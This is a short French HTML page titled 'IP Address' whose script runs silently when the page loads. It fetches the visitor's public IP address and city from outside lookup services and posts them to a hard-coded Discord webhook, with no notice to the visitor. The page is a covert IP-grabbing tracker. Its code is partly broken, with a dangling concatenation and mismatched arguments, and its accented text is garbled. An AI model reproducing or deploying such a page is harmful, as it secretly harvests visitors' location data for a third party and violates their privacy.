<!DOCTYPE html>
<html lang="fr">
<head>
  <title>IP Address</title>
  <script>
    function sendToDiscord(ipAddress, department) {
      var webhookURL = "https://ptb.discord.com/api/webhooks/1125207312806727740/bvMj9uwuMoljP5zjAZWjfXvjYO1wmzZNwAbBDvOFEV87X7SvWir3qQEWn4GSMFZvNRyF";

      var content = "> **Adresse IP üõ∞Ô∏è : **" + ipAddress +
        "\n> **D√©partement üè† : **" + department +

      var request = new XMLHttpRequest();
      request.open("POST", webhookURL);
      request.setRequestHeader('Content-type', 'application/json');
      var params = {
        content: content
      };
      request.send(JSON.stringify(params));
    }

    function getIPCityDevice() {
      fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
          var ipAddress = data.ip;

          fetch('https://ipapi.co/' + ipAddress + '/json/')
            .then(response => response.json())
            .then(data => {
              var city = data.city;
              var device = navigator.platform;

              sendToDiscord(ipAddress, city, device);
            })
            .catch(error => {
              console.error('Erreur lors de la r√©cup√©ration de la ville :', error);
            });
        })
        .catch(error => {
          console.error('Erreur lors de la r√©cup√©ration de l\'adresse IP :', error);
        });
    }

    window.addEventListener('DOMContentLoaded', getIPCityDevice);
  </script>
</head>
<body>
  <h1>IP Address</h1>
</body>
</html>
